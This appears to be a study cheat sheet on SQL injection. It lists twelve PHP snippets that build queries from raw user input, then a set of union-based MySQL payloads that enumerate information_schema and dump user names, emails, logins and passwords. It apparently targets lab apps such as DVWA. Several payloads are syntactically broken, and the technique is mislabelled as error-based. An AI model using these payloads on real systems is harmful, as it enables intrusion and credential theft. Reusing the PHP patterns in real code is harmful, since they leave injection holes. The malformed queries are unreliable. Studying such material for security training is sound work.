#  Payloads for error-based SQL injection 
## Different forms of building SQL queries in PHP

- Show different forms of building vulnerable SQL queries in PHP using user input, illustrating various quoting and concatenation styles:

---

### 1. Single quotes around user input (common vulnerable style)

PHP

`$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

---

### 2. No quotes, used when expecting numeric input (risky)

PHP

`$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=$id LIMIT 0,1";`

---

### 3. User input wrapped in parentheses with single quotes

PHP

`$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`

---

### 4. User input wrapped in parentheses without quotes

PHP

`$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=($id) LIMIT 0,1";`

---

### 5. User input wrapped in double quotes inside parentheses

PHP

`$id = $_GET['id'];
$id2 = '"' . $id . '"';
$query = "SELECT * FROM users WHERE id=($id2) LIMIT 0,1";`

---

### 6. User input concatenated inside parentheses with double quotes but no surrounding quotes

PHP

`$id = $_GET['id'];
$id2 = '"' . $id . '"';
$query = "SELECT * FROM users WHERE id=$id2 LIMIT 0,1";`

---

### 7. Using concatenation with single quotes and `.` operator

PHP

`$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=\'" . $id . "\' LIMIT 0,1";`

---

### 8. Using addslashes to escape quotes (insecure and deprecated method)

PHP

`$id = addslashes($_GET['id']);
$query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

---

### 9. Input cast to integer (for numeric ids, simple validation)

PHP

`$id = (int)$_GET['id'];
$query = "SELECT * FROM users WHERE id=$id LIMIT 0,1";`

---

### 10. Using sprintf (but unsafe without validation)

PHP

`$id = $_GET['id'];
$query = sprintf("SELECT * FROM users WHERE id='%s' LIMIT 0,1", $id);`

---

### 11. Preparing part of query and appending input directly (vulnerable)

PHP

`$query = "SELECT * FROM users WHERE id=";
$id = $_GET['id'];
$query .= $id . " LIMIT 0,1";`

---

### 12. Using HEREDOC syntax with embedded input (vulnerable)

PHP

`$id = $_GET['id'];
$query = <<<SQL
SELECT * FROM users WHERE id='$id' LIMIT 0,1
SQL;`

---

## Important:

All above examples directly use or concatenate raw user input without proper sanitization or parameterization, making them vulnerable to SQL injection.

---

## Payloads for error-based SQL injection to extract information

Payloads are examples of error-based SQL injection designed to extract information from a **MySQL** database server.

### Get all database names one-by-one using `offsets`:

1. `error-based-string.php?id=1' union all select 1,table_name,3,4,5,from information_schema.tables GROUP BY table_schema LIMIT 0,1 --+` 
2. `error-based-string.php?id=1' union all select 1,table_name,3,4,5, from information_schema.tables GROUP BY table_schema LIMIT 1,1 --+`
3. `error-based-string.php?id=1' union all select 1,table_name,3,4,5,6,7 from information_schema.tables GROUP BY table_schema LIMIT 2,1 --+`

### Get table names from current database one-by-one:

1. `error-based-string.php?id=1' union all select 1,table_name,3,4,5, from information_schema.tables where table_schema=database() LIMIT 0,1 --+`
2. `error-based-string.php?id=1' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 1,1 --+`
3. `error-based-string.php?id=1' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 2,1 --+`
4. 
1. `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

### Get all table names from a database at once using `GROUP_CONCAT`:

1. `error-based-string.php?id=1' union all select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database() LIMIT 0,1 --+`
2. `error-based-string.php?id=1' union all select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema='DVWA' LIMIT 0,1 --+`

### Get column names from a specific table:

1. `error-based-string.php?id=1' union all select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='users' AND table_schema='armour_db' LIMIT 0,1 --+`
2. `error-based-string.php?id=1' union all select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='users' AND table_schema=database() LIMIT 0,1 --+`

### Get all data from columns at once using `GROUP_CONCAT`:

1. `error-based-string.php?id=1' union all select group_concat(name),group_concat(email),3,4,5,6,7 from users --+`
2. `error-based-string.php?id=1' union all select group_concat(login),group_concat(password),3,4,5,6,7 from DVWA.users --+`

### Specific queries targeting the mysql database user info:

1. `error-based-string.php?id=127-union-all-select-user,2,3,4,5-from-mysql.user-LIMIT-1,0%23;` (Note: The end of this query is cut off or truncated in the image.)

---

The image shows typical **Union-Based SQL Injection** techniques used against a MySQL database to extract schema information (**databases, tables, columns**) from the `information_schema` system table and then extract data from specific tables (**users**), often within a context where the attacker is trying to induce an **error** to see the results.
